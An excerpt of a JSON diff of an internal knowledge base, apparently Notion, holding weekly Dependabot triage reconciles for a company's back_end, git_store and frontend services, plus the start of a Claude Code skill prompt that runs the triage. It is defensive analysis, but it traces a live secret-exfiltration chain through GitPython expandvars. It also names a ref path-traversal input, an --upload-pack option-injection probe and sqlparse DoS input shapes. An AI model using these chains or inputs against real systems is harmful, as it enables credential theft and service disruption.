B → 621 ms, 1.6 KB → 5,254 ms; dollar-quotes 14.9 KB → 334 ms, 62.9 KB → 4,421 ms; benign ~1 ms. That is ≈3,200× amplification into the main Flask/gunicorn process — not celery, not a Modal sandbox — and #780 raises SQLParseError only after burning the time, so sqlparse's own depth/token caps are not a mitigation. #779 stays NO: its pathology needs an all-comment token stream, which the surrounding SELECT … FROM … prevents (14 KB → 18 ms, 140 KB → 48 ms embedded, vs 549 ms standalone).\nConfirmed still-dead paths (unchanged from the original triage, re-verified): MQLConverter (convert.py:80) needs get_sql_query(sql=…) and back_end's sole caller never passes it; parse_identifiers_from_clause (query_base.py:41) fires only on string where/having/order_by while QueryTranslator.parse_filters() always emits lists (_is_literal at single_query_resolve.py:228-229); no back_end code passes funnel= into metrics-layer at all; the zoe_benchmarks evaluator is offline harness code no route imports. Revised invariant to keep reviewable: any attacker-supplied SQL fragment that can be spliced into a compiled query — today dynamic_field.sql, tomorrow anything similar — reaches sqlparse.format through the pretty=True path for every non-Trino/Athena warehouse. The durable fix is therefore twofold: bump sqlparse, and validate/bound dynamic_field.sql on ingest so the next parser CVE is not automatically reachable. Residual uncertainty, stated honestly: the chain is verified statically at every hop and the final sqlparse step measured on the real installed version with a realistically shaped query, but no authenticated end-to-end HTTP request was fired to prove it byte-for-byte. That would only strengthen the case; it does not gate the fix, which is a lock-only bump.\nOnly one manifest changed on dev across the 31 commits since Aug 17 (window re-checked twice during the run as origin/dev advanced; final tip 8a9dd2ad45) — services/back_end/poetry.lock + pyproject.toml, a modal 1.5.3 → 1.5.4 bump (constraint ^1.0.0 → ^1.5.4, commit 37ae13d40a / #8713) with no security content. Widening the window back to the last pre-Aug-17 commit (36642cc876) surfaces no additional manifest changes, so the modal bump is the only dependency movement under either window. Every other installed-version fact in the rows above therefore still holds, re-verified directly against the lockfiles: back_end python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1 / Pillow 12.3.0 / GitPython 3.1.57 / pyarrow 22.0.0; git_store still GitPython 3.1.45, starlette 0.46.2, python-multipart 0.0.17, orjson 3.11.4, urllib3 2.6.3.\nAll five load-bearing invariants re-verified and holding. (1) cryptography #749 — the SAML ACS still always pins the customer IdP cert: signxml/XMLVerifier still has exactly one import site repo-wide (api/services/sso/saml/response.py:5), both verify( calls pass x509_cert= (:64, :89), the value is a non-optional parameter (:22) supplied from the provider record (saml_providers/service.py:125-140, rejected as missing at :128-130), and there are still zero hits for cert_resolver=, PolicyBuilder, ServerVerifier, or load_pem_x509_certificates anywhere in back_end or git_store. The backing column is still nullable=False, at api/models/saml_models.py:19 — correcting the bare saml_models.py:19 cited in earlier reconciles, which resolves to no such file at the repo-root models/ path a reader would try first. The public ACS route (api/v2/organizations/saml_providers/routes.py:108-112, Auth(public=True) at :109) was untouched this week. (2) GitPython #770/#764 — still zero hits for .submodules, Submodule., .gitmodules, or --recurse-submodules across back_end (incl. vendored metrics_layer) and git_store. (3) Option-forwarding family — clone_from still hardcodes multi_options=[\"--no-single-branch\"] (git_store/main.py:1207, :1215) and the two metrics_layer clone sites still pass none (core/parse/github_repo.py:212, :222); Repo.init(repo_path) still takes zero kwargs (git_store/main.py:914); config_writer/set_value/IndexFile./TagReference.create still have zero call sites in either service; create_remote (git_store/main.py:2158) and its back_end client wrapper (api/services/git_store/client.py:971) still have zero invoking callers. (4) The git-store LaunchDarkly gate still guards all five GitStoreDataModelEditorUtils entry points (api/blueprints/data_model_editor.py:220, 527, 684, 729; api/data_model/project_manager.py:431), get_feature_flag still hard-returns False when LaunchDarkly and env both miss (api/definitions/feature_flags.py:195-224), and there is still no FF_GIT_STORE_MICROSERVICE override anywhere in the repo. (5) Pillow still pinned 12.3.0 and no new unrestricted decode path appeared.\nDrift check (28 commits): no new Form() / UploadFile / request.form() / Auth(public=True) / PublicResource surfaces were added in back_end, git_store, or mcp_server (the diff contains zero additions matching any of them), so the public SAML ACS endpoint remains the only unauthenticated form-parsing surface and is still covered by the patched multipart/starlette pins. Frontend: no axios.create, interceptors, or xsrfCookieName (the one baseURL hit, slices/dataModel/dataModelApi.ts:484, is a local variable holding a WebSocket URL, not an axios config); src/utils/router.tsx is still 7 lines with a single catch-all client-only Data Mode route and no loaders/actions/redirect(); zero _.template, window.vega, or VEGA_DEBUG; js-yaml load() still has the single convertYAMLToJSON.ts site. Repo-wide StaticFiles count is still zero.\nPath corrections (bookkeeping only, no verdict change): the Pillow upload decode has moved from conversation_processor.py:831 to :833 (still Image.open(io.BytesIO(raw_bytes)) with no formats= restriction). The recorded invariant's \"only conversation_processor\" wording is too narrow and is amended here to enumerate all three first-party Image.open sites with their trust context, so future reviewers check the right set: (a) conversation_processor.py:833 — user-uploaded chat images, extension-gated but no formats=, the path that made #418/#530/#704 material; (b) api/interfaces/pdf_interface.py:80 and :86 — decode self._image_bytes, set at :43 from super().get_bytes_and_stats(), which resolves through LambdaInterface._get_bytes_from_data (api/interfaces/lambda_interface.py:63-90): it invokes the renderer Lambda and reads the screenshot back from our own S3 bucket. This is renderer-produced output, not caller-supplied base64 — a distinction worth recording because the surrounding code is an authenticated user-triggered export, so it superficially reads like a user-input path; (c) code_interpreter/scripts/generate-thumbnail.py:47 — runs inside the network-blocked Modal sandbox. Only (a) takes untrusted bytes, which is why the Pillow rows scope to it. No open Pillow alerts remain regardless (12.3.0). Scope gap unchanged for a second week: services/mcp_server still has no lockfile (only pyproject.toml), so its floating deps — mcp[cli]>=2.0.0,<3.0.0, httpx>=0.27.0, cryptography>=46.0.7,<47 — stay outside Dependabot's scan surface entirely. The service did change this week (#8723, #8731, #8734) without any pinning being added, so this gap is actively accumulating unscanned surface rather than sitting static.\nNon-Dependabot observation worth flagging to whoever owns container scanning: services/git_store/Dockerfile:3 moved from python:3.11-slim to the full python:3.11 base image this week. That ships a much larger OS package set, so image-scanner findings on git_store should be expected to jump. It changes no Python dependency and touches none of the library verdicts above — recorded here only so the jump isn't mistaken for a real regression.\nFastest burndown: there is now one urgent item. Regenerate services/back_end/poetry.lock for sqlparse 0.6.0 (poetry update sqlparse, lock-only) — this resolves both material findings (#780/#781) plus non-material #779, and also picks up a fourth DoS on the same format(reindent=True) path, GHSA-cfqr-cjx5-5jcm, which is not among these three alerts. Pair it with input validation on dynamic_field.sql at question_manager.py:47-58 so the next parser CVE is not automatically reachable. After that, the remaining value is clearing noise, cheapest first: yarn upgrade brace-expansion (#690/#692/#743/#744/#745/#751); yarn upgrade js-yaml@^4.3.1 (#691/#771); a resolutions pin of nanoid: ^3.3.18 plus yarn install (#773/#777 — plain yarn upgrade nanoid is a no-op for a transitive-only package); and dropping the dead webpack/babel-loader resolutions at services/front_end/package.json:10-11 to permanently kill the recurring fast-uri cluster. Largest single reduction remains the git_store poetry.lock GitPython bump to ≥3.1.58 (19 alerts, lock-only) — or, better, retiring the service outright if it is genuinely dead, which removes all 13 of its GitPython alerts plus its starlette/multipart/orjson/urllib3 alerts permanently instead of resetting the treadmill. Manual dismissals still owed: fast-uri #714/#726/#753/#774/#775 and serialize-javascript #453 (orphaned lockfile entries, not present in node_modules) and extract-zip #776 (no upstream patch exists) — all as vulnerable code is not actually used.\nAugust 31, 2026 reconcile: Open set is 5 critical / 138 high (from 5 / 146 on Aug 24) → 44 package/manifest clusters, 0 materially exploitable. 8 alerts closed this week — the first closures in five weeks (the previous most-recent fixed_at was July 28, 2026); zero new alerts opened and zero dismissals.\n- sqlparse #779/#780/#781 fixed August 25, 2026 (commit 28c96babf9, ZEN-8666, PR #8750): sqlparse 0.5.5 → 0.6.0 (lock-only) plus the recommended defence-in-depth — dynamic_columns[].dynamic_field SQL is now validated on ingest: validate_dynamic_fields is called at api/data_model/question_manager.py:69 and :73, and _validate_dynamic_field_sql (:97-117) raises RequestValidationError for non-string sql, length > 4096 (Definitions.max_field_sql_length, api/definitions/base_definitions.py:21), parenthesis nesting depth > 32 (well under sqlparse's own cap of 100 — the #780 shape), or more than 2 dollar-quote delimiters (the #781 ReDoS shape), with unit tests in api/tests/unit/test_question_manager_dynamic_field_sql.py. Both material findings are resolved and the revised invariant (\"any attacker-supplied SQL fragment spliced into a compiled query reaches sqlparse.format via the pretty=True path\") is now guarded at both ends — patched parser and bounded input.\n- back_end GitPython #765/#766/#768/#769/#770 fixed August 27, 2026: gitpython 3.1.57 → 3.1.60, riding along in the metrics-layer 0.16.41 → 0.16.42 lock regeneration (commit 7616c3cf3d, PR #8788). back_end now exceeds the 3.1.58 fix-all target. git_store's six alerts from the same wave (#754/#759/#760/#762/#763/#764) remain open on its stale 3.1.45 lock, along with the rest of its 19-alert GitPython cluster.\nManifest movement (only three, verified against the full diff 8a9dd2ad45..origin/dev): services/back_end/poetry.lock + pyproject.toml (the two remediations above; all other verdict-relevant pins re-verified unchanged — python-multipart 0.0.30, starlette 1.3.1, fastapi 0.133.1, Pillow 12.3.0, pyarrow 22.0.0, cryptography 46.0.0, pyopenssl 25.3.0, ecdsa 0.19.2); services/mcp_server/pyproject.toml (mcp[cli] range → exact pin ==2.1.0, added redis>=5.0.1,<6); and a new Dependabot scan surface: services/mcp_server/ui/package.json + package-lock.json (MCP Apps UI — build-time Vite bundle; runtime deps @modelcontextprotocol/ext-apps, dompurify, marked). Note for future triage: the UI package self-describes as build-time-only, but dompurify/marked output ships into the served single-file HTML, so advisories against those two should be triaged as potentially material to the served page. No open alerts against it yet. Scope gap, third consecutive week: services/mcp_server still has no Python lockfile, so its floating Python deps remain outside Dependabot's scan entirely — the exact mcp==2.1.0 pin narrows but does not close this. git_store and renderer had zero commits; front_end yarn.lock, renderer package-lock.json, and git_store poetry.lock are all untouched, so every installed-version fact in the rows above still holds.\nAll five load-bearing invariants re-verified and holding. (1) cryptography #749 — SAML ACS still pins the customer IdP cert: exactly one XMLVerifier import repo-wide (api/services/sso/saml/response.py:5), both verify( calls pass the non-optional x509_cert= (:62-64, :87-89); zero hits for cert_resolver=/PolicyBuilder/ServerVerifier/load_pem_x509_certificates; column still nullable=False (api/models/saml_models.py:19). (2) GitPython submodule invariant — zero hits for .submodules/Submodule./.gitmodules/--recurse-submodules across back_end (including the metrics_layer submodule at its new v0.16.42 pin) and git_store. (3) The two metrics_layer clone sites (core/parse/github_repo.py:212, :222) still pass no multi_options; all git_store option-forwarding checks hold byte-for-byte (service commit-frozen): clone_from hardcodes multi_options=[\"--no-single-branch\"] (git_store/main.py:1202-1215), Repo.init zero kwargs (:914), archive() treeish validated against repo.branches (:1692-1695), config_writer/set_value zero call sites, create_remote (:2158) zero invoking callers, create_head inputs unchanged (:1230, :2450). (4) The git-store LaunchDarkly gate holds: all five GitStoreDataModelEditorUtils entry points still gated (api/blueprints/data_model_editor.py:220/:527/:684/:729, api/data_model/project_manager.py:431), get_feature_flag still hard-returns False (api/definitions/feature_flags.py:227), no FF_GIT_STORE* override anywhere, and ENV_VAR_TO_FEATURE_FLAG_MAP still has no git-store entry — it did gain FF_ZOE_GIT_V2 this week (:38, commit e0b4855c24), a new env-overridable flag for Zoe Git V2, unrelated to git-store. (5) Pillow — decode still only at conversation_processor.py:833, still no formats=, zero new Image.open sites in the week's diff.\nDrift check (~40 commits): zero added Form(/UploadFile/request.form(/Auth(public=True)/PublicResource in back_end or mcp_server — the public SAML ACS remains the only unauthenticated form-parsing surface, still covered by the patched pins. Frontend: 24 commits of UI churn with zero hits on any alert-relevant pattern (no axios.create/interceptors/baseURL/xsrfCookieName, no _.template, no window.vega/VEGA_DEBUG, no react-router loaders/actions/redirect(, no new js-yaml load( sites); src/utils/router.tsx untouched — still the 7-line catch-all client-only Data Mode route. New first-party git-execution surface worth tracking: Zoe Git V2 (commits e0b4855c24 #8735, 1c8a280c2f #8771) adds repo bundling/replay/push in api/services/agents/git_bundle/ — it deliberately uses subprocess git CLI, not GitPython (zero new GitPython call sites in the diff, so no GitPython verdict changes), with agent-supplied branch names constrained by _SAFE_BRANCH_NAME (push_refspec.py:15-20, \"SECURITY: Do not modify\"), clone/push URLs resolved from workspace config rather than the request, git bundle verify + fast-forward checks on bundles, gated behind the context-editing + zoe-git-v2 flags; it executes in the back_end agent loop and the Modal sandbox. Future git/GitPython advisories should be triaged against this surface too, not just git_store and metrics_layer.\nStanding items (unchanged): manual dismissals still owed — fast-uri #714/#726/#753/#774/#775 and serialize-javascript #453 (orphaned yarn.lock entries, not in node_modules) and extract-zip #776 (no upstream patch exists), all as vulnerable code is not actually used. Largest single count reduction remains the git_store poetry.lock GitPython bump to ≥3.1.58 (19 alerts, lock-only) — or retiring the service outright if it is genuinely dead. Frontend quick wins still open: yarn upgrade brace-expansion (#690/#692/#743/#744/#745/#751), yarn upgrade js-yaml@^4.3.1 (#691/#771), resolutions pin nanoid: ^3.3.18 (#773/#777), delete the dead webpack/babel-loader resolutions (package.json:10-11) to kill the recurring fast-uri cluster; plus the long-standing hygiene sweep (axios ≥1.16, react-router-dom ≥7.18, aws-amplify, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration).\nSeptember 8, 2026 reconcile: Open set is 5 critical / 150 high (from 5 / 138 on Aug 31) → 48 package/manifest clusters, 122 distinct advisories, 0 materially exploitable (GitPython #724, git_store, was provisionally flipped from NO to YES during this run and reverted to NO the same day on product confirmation that git_store is not used anywhere in production; details below). 13 new high alerts, all non-material; 1 closed — cryptography #749 no longer exists (API 404; GitHub removed it and re-issued the same GHSA-jwv3-5hgf-82ww as #802 on Sept 5 with a bumped patched version, 49.0.0) — and zero fixed_at closures or dismissals, so the most recent real remediation remains August 27, 2026. Bookkeeping correction: the git_store python-multipart #407 row had been marked Remediated = Yes since June 9 although #407 has been open the whole time (git_store still pins 0.0.17; only back_end's leg #602 was ever fixed) — reverted to No.\nThe provisional finding, reverted the same day on product confirmation that git_store is not used anywhere in production — GitPython #724 (GHSA-rwj8-pgh3-r573, Repo.clone_from runs os.path.expandvars() on the clone URL; git_store pins 3.1.45, fixed in 3.1.52). The Aug 3 downgrade rested on a single premise: every path carrying workspace.github_url into git_store was gated by the never-enabled git-store-microservice LaunchDarkly flag. Commit 76c5cf7dab (#8897, \"Conversation-scoped Git V2 backend\" — git_store's first commit in months) broke that premise. It adds a back_end FastAPI router api/v2/workspaces/vcs/routes.py on the main app (api/v2/initialize_fastapi.py:106, :147) with 14 routes gated only by Auth(data_model_edit); just /vcs/validate and /vcs/deploy also require require_git_v2_feature (routes.py:137, :183), and VcsService has zero flag checks (the dependency's own docstring says the read routes \"rely on the frontend gate\"). All 12 ungated routes call _git_store_or_raise (vcs/service.py:1211-1236), which clones on every request: ensure_repo_cloned_to_git_store(github_url=workspace.github_url, …) (api/services/git_store/client.py:138) → prepare_git_store_auth (:92, passthrough at :120) → client.clone_repo (:189) → git_store POST /workspaces/{id}/repos/clone (git_store/git_store/main.py:1174, CloneRequest.url: str with no validator, models.py:176) → clone_url = clone_data.url (:1218) → Repo.clone_from (:1233/:1242) → expandvars (confirmed present in the running git_store container, GitPython 3.1.45). github_url is still written unvalidated by ModifyWorkspaces.patch (api/blueprints/workspace.py:1121-1226, edit_settings; 4-key denylist at :1184; Workspace.modify blanket-setattr, workspace_models.py:679-687), and organization_admin and admin hold both edit_settings and data_model_edit (database/seed_database.py:110-148) — one workspace admin, two requests, and git_store sends up to 118 decrypted prod secrets (see the Aug 3 trace in the row) to a host of the attacker's choosing. git_store is deployed in every environment (scripts/deploy_github_actions.sh:20-24); nothing in the frontend or MCP server calls /vcs/* yet, so exposure today is via direct authenticated API calls — a likelihood modifier, not a mitigation. Fix: (1) regenerate services/git_store/poetry.lock to GitPython ≥3.1.58 — lock-only, pyproject.toml already allows it, closes #724 plus the other 18 git_store GitPython alerts (#554, #556, #600, #603, #607, #719, #721, #738-#742, #754, #759, #760, #762, #763, #764); (2) validate github_url on write (scheme/host allowlist, reject $); (3) KUBERNETES_BUILD=true + explicit secrets: on the git-store task defs; (4) consider gating the /vcs read routes behind zoe-git-v2 like validate/deploy. Recording the meta-lesson explicitly: a verdict that rests on \"this service is unused\" must be re-derived the week the service gets a commit — that is exactly what happened here, and the flag-gate invariant (4) below is now demoted from \"sole control\" to \"one of several entry points\". Resolution (September 8, 2026): product confirmed that git_store is not used anywhere in production, so #724 and the rest of the git_store cluster stay non-material on that basis. The chain above is retained verbatim because every hop of it is live in code; the verdict is now conditional on a deployment fact rather than a code fact and must be re-derived before git_store or the /vcs routes are put into production use. The lock-only GitPython ≥3.1.58 bump is still recommended as a pre-emptive fix.\nThe other git_store verdicts were re-derived on code-level grounds alone and still hold (they can no longer lean on \"unused\"): multi_options still hardcoded [\"--no-single-branch\"] (git_store/git_store/main.py:1238, :1246) and never forwarded (#554/#556 stay NO); Repo.init(repo_path) zero kwargs (:945); config_writer/set_value still zero runtime call sites — the six config_writer() additions in #8897 are all in git_store/tests/ (conftest.py:27-29 sets the test author; test_merge_branch.py, test_review_endpoints.py, test_squash_merge.py, test_sync_branch.py, test_write_files.py), so #603/#607 stay NO; create_remote (:3227) — the back_end wrapper add_remote (client.py:1447) still has zero invoking callers; zero hits for IndexFile, TagReference, .submodules/.gitmodules/--recurse-submodules in either service (the 3.1.58 wave stays NO); archive() treeish is branch or \"HEAD\" and the branch must first resolve via repo.heads[branch].checkout() (:1720, :1741, :1794-1807). One invariant is new and load-bearing — (6) branch-name validation: create_head now receives request-supplied branch names on the ungated POST /vcs/branches route (main.py:4087/:4089, also :1261, :3543), and the #600 ref path traversal (GHSA-7545-fcxq-7j24, SymbolicReference.create joins refs/heads/<name> onto .git with no boundary check) is empirically live in git_store's 3.1.45 — repo.create_head(\"../../../../tmp/…\") in the container wrote a ref file outside the repository. It stays NO only because back_end's _normalize_branch_name (vcs/service.py:1592-1620) rejects .., //, @{, leading/trailing ., \\, control characters and git's forbidden set before the name leaves back_end, and git_store's own path-traversal guard (main.py:833) covers file paths. Treat that normalizer as security-relevant code; the lock bump makes it defence-in-depth rather than the sole control. Also re-checked: the positional-ref pattern git ls-remote --heads <remote> <ref> (:498, :2450) is now fed by data_model_edit users' ref query params — empirically not option-injectable (git stops option parsing after the remote; a --upload-pack=… ref is treated as a pattern and nothing executes), but a -- separator remains cheap insurance; git grep passes the query after -e (:2569), and reset --hard uses f\"{remote.name}/{branch}\" (:524). git_store still has zero Form(/UploadFile/request.form(/StaticFiles sites across its now-37 routes (python-multipart/starlette rows unchanged) and its orjson import (main.py:36) has no call sites.\n13 new high alerts, all non-material (rows added/updated above): back_end — thrift #782/#788 (data-amplification / infinite-loop DoS in THeaderTransport/TZlibTransport/TCompactProtocol; sole dependent databricks-sql-connector 3.7.5 talks to customer-configured Databricks hosts but uses only THttpClient + TBinaryProtocol, zero references to the vulnerable classes anywhere in site-packages; upgrade blocked until databricks-sql-connector 4.5.0, a major bump that drops our sqlalchemy extra) and cryptography #802 (re-issue of #749, same verdict — SAML ACS still pins x509_cert, signxml is the only path-builder consumer and skips it when a cert is pinned; upgrade chain is snowflake-connector 4.x → pyopenssl 26 → cryptography 50, which also closes #748/#654/#417 and pyopenssl #467). front_end — browserslist #783/#784 (babel build chain under @vitejs/plugin-react; repo-authored package.json:204-215 config, no stats file, absent from the bundle; Dependabot's \"runtime\" scope is an artefact of @sentry/vite-plugin/vite-plugin-svgr sitting in dependencies), nanoid #786 (same postcss nanoid(6) constant as #773/#777), @faker-js/faker #791 (direct runtime dep that does ship, 2.7 MB chunk — but helpers.fake has zero call sites and the exploitable fakeEval.resolveProperty does not exist in the installed 7.6.0), fast-uri #793/#794 (the same orphaned, uninstalled lockfile entry — now seven alerts on a package that is not in node_modules). mcp_server/ui — fast-uri #797/#798/#799/#800 (first alerts on the new manifest; ext-apps → @modelcontextprotocol/sdk → ajv → fast-uri chain, but the SDK client that imports ajv is never used, a rebuild of the single-file widget from the lockfile contains zero fast-uri/ajv code, and no node_modules ship in the Python image; lockfile-only fix npm update fast-uri). New section added above for this service.\nManifest movement (verified against the full diff 8fa3f335f9..origin/dev, 56 commits): services/back_end/poetry.lock + pyproject.toml (metrics-layer 0.16.42 → 0.16.43, gitpython 3.1.60 → 3.1.61, ~35 routine minor bumps; every verdict-relevant pin re-verified unchanged: cryptography 46.0.0, pyopenssl 25.3.0, thrift 0.20.0, ecdsa 0.19.2, pyarrow 22.0.0, black 24.10.0, python-multipart 0.0.30, starlette 1.3.1, fastapi 0.133.1, Pillow 12.3.0, sqlparse 0.6.0, redshift-connector 2.1.16); services/front_end/package.json + yarn.lock (only change: added highcharts 13.0.2 + highcharts-react-official 3.2.3 — a new runtime charting dependency with no open alerts; worth remembering that Highcharts renders backend/LLM-shaped configs like vega does); services/mcp_server/pyproject.toml (cryptography floor raised >=46.0.7,<47 → >=49.0.0, per the commit note the Apple-Silicon SIGILL no longer reproduces — still no Python lockfile, fourth consecutive week, so this stays outside Dependabot's scan). services/git_store/poetry.lock, renderer package-lock.json, and lambda poetry.lock untouched; renderer and lambda had zero commits. Stale check (script-verified against every origin/dev lockfile, packaging.version comparison): 0 of 155 open alerts are stale — every one has an installed version inside its vulnerable range; two have no patched version at all (ecdsa #333, extract-zip #776 — dismiss-only); sharp #722 is a manifest-range scan (^0.33.0, no lockfile anywhere under back_end) and is valid until the range is bumped. All previously remediated packages are still at or above their patched versions (redshift-connector 2.1.16, Pillow 12.3.0, python-multipart 0.0.30, starlette 1.3.1, sqlparse 0.6.0, back_end GitPython 3.1.61, vega-functions 6.1.1, storybook 8.6.18).\nLoad-bearing invariants re-verified (now six). (1) cryptography #802 — SAML ACS still pins the customer IdP cert: one XMLVerifier import (api/services/sso/saml/response.py:5), both verify( calls pass x509_cert= (:64, :89), column still nullable=False (api/models/saml_models.py:19), zero hits for cert_resolver=/PolicyBuilder/ServerVerifier/load_pem_x509_certificates; the SAML router still has exactly three Auth(public=True) routes (login/acs/metadata, saml_providers/routes.py:95, :109, :136) and only acs parses Form(...). (2) Submodule invariant — zero hits across back_end (incl. metrics_layer 0.16.43) and git_store. (3) Option-forwarding — see the git_store paragraph above; the two metrics_layer clone sites (core/parse/github_repo.py:212, :222) still pass no multi_options. (4) The git-store-microservice gate still guards the legacy Flask paths (api/blueprints/data_model_editor.py:223, :553, :722, :767; api/data_model/project_manager.py:438), get_feature_flag still hard-returns False (api/definitions/feature_flags.py:229), and ENV_VAR_TO_FEATURE_FLAG_MAP still has no git-store entry — but the gate is no longer the sole path into git_store (see the #724 paragraph); the control for the git_store cluster is now the product fact that git_store is unused in production. (5) Pillow — the upload decode moved to conversation_processor.py:889 (still Image.open(io.BytesIO(raw_bytes)), still no formats=); pdf_interface.py:80/:86 unchanged; no new Image.open sites outside tests. (6) New: _normalize_branch_name (vcs/service.py:1592-1620) is what keeps GitPython #600 non-material on the ungated POST /vcs/branches route.\nDrift check (56 commits): exactly one new Auth(public=True) route — GET /mcp_connections/oauth/callback (api/v2/mcp_connections/routes.py:264-275), a query-param-only OAuth callback (code/state/error) with signed-cookie state recovery and no Form(/UploadFile/multipart, so the public SAML ACS remains the only unauthenticated form-parsing surface, still covered by the patched multipart/starlette pins. No new Form(/UploadFile/request.form(/StaticFiles/Image.open/sqlparse.format additions in back_end or mcp_server. Frontend: zero hits on any alert-relevant pattern (axios.create/interceptors/xsrfCookieName, _.template, window.vega/VEGA_DEBUG, react-router loaders/actions/redirect(, new js-yaml load(, helpers.fake); src/utils/router.tsx still 7 lines, single catch-all client-only Data Mode route.\nFastest burndown — no urgent item (0 material). Largest single reduction, and the pre-emptive fix for the hair-trigger #724 verdict: regenerate services/git_store/poetry.lock to GitPython ≥3.1.58 (lock-only; closes #724 + 18 more), paired with github_url validation on write and a review of whether the /vcs read routes should sit behind zoe-git-v2. Then the cheap noise: cd services/mcp_server/ui && npm update fast-uri (#797-#800, lock-only); frontend resolutions pins nanoid: ^3.3.18 (#773/#777/#786) and browserslist: ^4.28.7 (#783/#784); yarn upgrade brace-expansion (#690/#692/#743/#744/#745/#751) and yarn upgrade js-yaml@^4.3.1 (#691/#771); delete the dead webpack/babel-loader resolutions (services/front_end/package.json:6-14) to kill the seven-alert fast-uri cluster permanently; a git_store fastapi/starlette/multipart parity bump (#407/#411/#601/#681/#683/#677/#409). Larger, scheduled items: snowflake-connector-python 4.x → pyopenssl 26 → cryptography 50.0.1 (closes #802/#748/#654/#417 + pyopenssl #467); databricks-sql-connector 4.5.0 + databricks-sqlalchemy (closes thrift #782/#788); replace @faker-js/faker with a few lines of crypto.getRandomValues (closes #791 and drops 2.7 MB from the bundle). Manual dismissals still owed, all as vulnerable code is not actually used: fast-uri #714/#726/#753/#774/#775/#793/#794 and serialize-javascript #453 (orphaned, not installed), extract-zip #776 and ecdsa #333 (no upstream patch exists). Scope gap: add a lockfile to services/mcp_server so its Python deps enter the scan.",
       "keywords": [
+        "CC876",
         "encryption",
         "tls",
+        "security",
         "audit",
+        "incident",
         "vulnerability",
+        "policy",
         "sso",
         "saml",
         "aws",
@@ -1284,7 +1323,22 @@
         "vendor",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:22.452Z"
+      "lastUpdated": "2026-09-13T02:08:51.430Z"
+    },
+    {
+      "id": "3d5a8dad-05ac-81b7-bd37-e34d4fd4b490",
+      "title": "Dependabot Triage — Claude Code skill (/dependabot-triage)",
+      "parent": "Critical & High CVSSv3 Triage ",
+      "content": "Copy of the Claude Code slash-command skill that produces the weekly Critical & High CVSSv3 Triage  reconcile. Canonical source is .claude/commands/dependabot-triage.md in the Zenlytic/zenlytic repo (mirrored at ~/.claude/commands/). Invoke with /dependabot-triage in Claude Code from a checkout of the repo. Copied here September 8, 2026 — if the two drift, the repo file wins.\nSkill description: Weekly triage of open critical & high Dependabot alerts against our code paths; reconcile the Notion triage doc.\n---\nYou are performing the weekly dependency-vulnerability triage for the Zenlytic/zenlytic repo. The goal: pull every open critical and high severity GitHub Dependabot alert, determine which are materially exploitable given how we actually use each package, and reconcile the findings into the Notion tracking doc — updating remediation status, adding newly-opened alerts, and marking resolved ones.\nNotion doc (the single source of truth — read it first, update it at the end):\nCritical & High CVSSv3 Triage \nToday's date is the run date — use it for the \"Date triaged\" column on any new rows and \"Date remediated\" on any newly-resolved rows. Convert to a human format like \"June 9, 2026\".\n---\n## Step 1 — Pull current alerts\nFetch open critical and high alerts (paginate; this repo routinely has 100+ highs):\n```\ngh api '/repos/Zenlytic/zenlytic/dependabot/alerts?state=open&severity=critical&per_page=100' --paginate \\\n  -q '.[] | {number, package: .dependency.package.name, ecosystem: .dependency.package.ecosystem, manifest: .dependency.manifest_path, scope: .dependency.scope, ghsa: .security_advisory.ghsa_id, cve: .security_advisory.cve_id, summary: .security_advisory.summary, vulnerable_range: .security_vulnerability.vulnerable_version_range, patched: .security_vulnerability.first_patched_version.identifier, url: .html_url}' | jq -s .\n```\nRun the same for severity=high. Then group by package + manifest so duplicate alerts (same advisory across version ranges) collapse into one triage row, and count how many distinct packages/advisories you have.\nAlso fetch the list of alerts that were OPEN in the Notion doc last week but are now CLOSED/FIXED — diff the doc's existing alert numbers against the current open set. Any alert in the doc but no longer open has been remediated (or dismissed) since last run.\n## Step 2 — Triage each cluster against real code paths\nThis is the core of the task and must be grounded in this repo's actual usage, not generic CVSS scores. For each package, determine:\n• Is it a direct or transitive dependency? Trace the chain (yarn why <pkg>, npm ls <pkg>, or grep the poetry.lock for who depends on it).\n• Is it runtime code that ships/executes, or dev/build/test tooling that only runs on trusted, repo-authored input?\n• Does the specific vulnerable code path/API get exercised by our code, with attacker-controlled input reaching it?\nService-by-service context that holds across runs (verify it still holds — code changes):\n• services/front_end — browser SPA built with Vite, tested with Vitest. Browser context means Node-only vectors (proxy/NO_PROXY, Node http adapter, server-side parsing) usually don't execute. React Router is Data Mode, client-only (no SSR/loaders/actions). Charts: vega-lite specs are LLM/backend-generated (vega_config in questionApi.ts), compiled and embedded in QuestionResultChartVega.tsx, and persisted on shared dashboards — so vega expression-engine vulns are a real stored-XSS surface. devDependencies don't ship, but dev-server vulns (vite/storybook WebSocket) can still compromise a developer machine.\n• services/renderer — headless-Chrome screenshot/PDF Lambda (puppeteer-core + @sparticuz/chromium). Navigates only to hardcoded Zenlytic URLs, reads config from our own S3, no proxies/FTP/websocket-server. Most transitive Node vulns here are dead code paths.\n• services/back_end — main FastAPI backend. Connects to customer-configured data warehouses (so DB-driver vulns processing server responses are material — see redshift-connector RCE). Image.open() runs on user-uploaded chat images (conversation_processor.py). Multipart parsing is reachable via the transcriptions upload endpoint AND the public/unauthenticated SAML ACS endpoint (saml_providers/routes.py, Auth(public=True)). When grepping first-party code, exclude venv/.\n• services/git_store — internal-only FastAPI service (no public route) managing customer git repos via GitPython. Check whether vulnerable GitPython APIs (config_writer, arbitrary multi_options/kwargs, traversal-capable ref inputs) are actually invoked — historically they are not.\n• services/lambda — Chalice cron jobs calling our own internal API; chalice/setuptools/wheel are deploy-time dev-group deps, not runtime.\nRun the triage as parallel subagents, one per service/package cluster (axios tends to be large enough to warrant its own agent). Each agent should: read the alert data for its cluster, trace dependency chains, fetch advisory details with gh api /advisories/<GHSA_ID> -q '{summary, description, cvss: .cvss.vector_string}', inspect the relevant first-party code, and return a markdown table with one row per distinct advisory: Dependency (alert #s, CVE) | Vulnerability/Risk | How it's used in our codebase (chain + code path) | Material risk? YES/NO + rationale. Tell each agent to cite real file paths and verified dependency chains, and to be conservative: \"material\" requires a plausible path from attacker-controlled input to the vulnerable code in a shipped/reachable context.\n## Step 3 — Reconcile the Notion doc\nFetch the current doc content (notion-fetch). It is organized as: a Critical section + table, then a High section with tables grouped by service. Each table has columns: Dependency (alert) | Vulnerability / Risk | How it's used in our codebase | Material risk? | Remediated? | Date triaged | Date remediated.\nUpdate it as a diff against last week, not a rewrite:\n- Newly remediated — for any alert that was in the doc but is no longer open (from Step 1's diff): set Remediated? = Yes and fill Date remediated with today's date. Keep the row 